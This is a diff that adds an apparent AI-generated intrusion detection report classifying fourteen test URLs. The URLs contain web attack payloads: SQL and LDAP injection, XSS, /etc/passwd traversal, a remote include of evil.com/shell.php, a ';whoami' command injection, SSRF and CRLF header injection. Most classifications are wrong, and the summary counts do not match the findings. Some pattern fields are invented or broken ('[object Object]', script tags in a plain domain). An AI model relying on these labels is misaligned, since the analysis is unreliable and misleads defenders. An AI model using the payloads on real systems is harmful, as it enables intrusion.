@@ -1,0 +1,132 @@
+═══════════════════════════════════════════════════════════════
+          HIDS - URL-Based Attack Detection Report
+              Powered by Ollama Phi3 AI Model
+═══════════════════════════════════════════════════════════════
+
+Analysis Date:        4/8/2026, 8:59:20 PM
+File Type:            CSV
+Total Entries (Modules): 14
+Threats Detected (Modules): 12 (85.7%)
+Ollama Enriched Entries: 14
+AI Model Used: phi3
+
+───────────────────────────────────────────────────────────────
+  CLASSIFICATION BREAKDOWN
+───────────────────────────────────────────────────────────────
+  SQL Injection             2 entries
+  Cross-Site Scripting (XSS) 2 entries
+  Normal                    2 entries
+  Local File Inclusion (LFI) 1 entries
+  Remote File Inclusion (RFI) 1 entries
+  Web Shell Upload          1 entries
+  Command Injection         1 entries
+  Server-Side Request Forgery (SSRF) 1 entries
+  LDAP Injection            1 entries
+  HTTP Header Injection     1 entries
+  Typosquatting / URL Spoofing 1 entries
+
+───────────────────────────────────────────────────────────────
+  DETAILED FINDINGS
+───────────────────────────────────────────────────────────────
+
+  [1] http://testphp.vuln/login?id=1 OR 1=1--
+      Source IP:       N/A
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        The URL contains a classic SQL injection payload.
+      Recommendation:  Immediately sanitize and validate all user inputs, implement prepared statements or stored procedures for database access.
+
+  [2] http://testphp.vuln/login?id=1/**/UNION/**/SELECT/**/null
+      Source IP:       N/A
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        URL contains SQL injection payload.
+      Recommendation:  Immediately sanitize user inputs and implement prepared statements to prevent SQL injections.
+
+  [3] http://testphp.vuln/search?q=<script>alert(1)</script>
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High
+      Patterns:        <script>alert(1)</script>
+      Recommendation:  Implement Content Security Policy headers and validate/sanitize user input.
+
+  [4] http://testphp.vuln/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High
+      Patterns:        <script><!--alert(1)--></script>
+      Recommendation:  Implement Content Security Policy (CSP) and validate/escape user input on the server side.
+
+  [5] http://testphp.vuln/download?file=../../etc/passwd
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High|Medium
+      Patterns:        [object Object]
+      Recommendation:  Implement strict input validation and output encoding to prevent directory traversal attacks.
+
+  [6] http://testphp.vuln/index.php?page=../../etc/passwd
+      Source IP:       N/A
+      Classification:  Directory Traversal
+      Risk Level:      Critical
+      Patterns:        Path traversal pattern used to access files outside of the web root directory.
+      Recommendation:  Implement strict input validation and sanitization, restricting file system access.
+
+  [7] http://testphp.vuln/index.php?page=http://evil.com/shell.php
+      Source IP:       N/A
+      Classification:  Command Injection
+      Risk Level:      Critical
+      Patterns:        The URL parameter is used to execute a command that includes 'evil.com', indicating potential for Command Injection.
+      Recommendation:  Immediately sanitize and validate all user inputs, especially those involved in constructing URLs or commands.
+
+  [8] http://testphp.vuln/ping?ip=127.0.0.1;whoami
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        The URL includes a semicolon which could be used to append additional parameters or commands.
+      Recommendation:  Validate and sanitize all user inputs, implement Content Security Policy.
+
+  [9] http://testphp.vuln/fetch?url=http://127.0.0.1/admin
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        URL parameter is used to inject a potential XSS payload.
+      Recommendation:  Implement input validation and output encoding.
+
+  [10] http://testphp.vuln/login?user=*)(|(user=*))
+      Source IP:       N/A
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        User input is directly concatenated into SQL query without sanitization.
+      Recommendation:  Sanitize and validate all user inputs using prepared statements or stored procedures.
+
+  [11] http://testphp.vuln/page?name=abc%0d%0aSet-Cookie:evil=true
+      Source IP:       N/A
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        URL contains encoded newline character followed by a Set-Cookie header with malicious content.
+      Recommendation:  Immediately sanitize and validate all user inputs, implement strict Content Security Policy (CSP), and use prepared statements for database access.
+
+  [12] http://arnazon-login.com
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        The URL contains suspicious script tags that could be used for XSS attacks.
+      Recommendation:  Implement strict Content Security Policy and input validation to prevent potential execution of malicious scripts.
+
+  [13] http://testphp.vuln/home
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High
+      Patterns:        The URL contains 'testphp.vuln' which is commonly associated with vulnerable PHP applications.
+      Recommendation:  Immediately conduct a thorough security audit of the application, specifically looking for XSS vulnerabilities.
+
+  [14] http://testphp.vuln/products?id=10
+      Source IP:       N/A
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        The URL contains a query parameter that could be used to inject malicious scripts.
+      Recommendation:  Implement strict input validation and output encoding.
+
+═══════════════════════════════════════════════════════════════
+  End of Report — Generated by HIDS Dashboard
+═══════════════════════════════════════════════════════════════
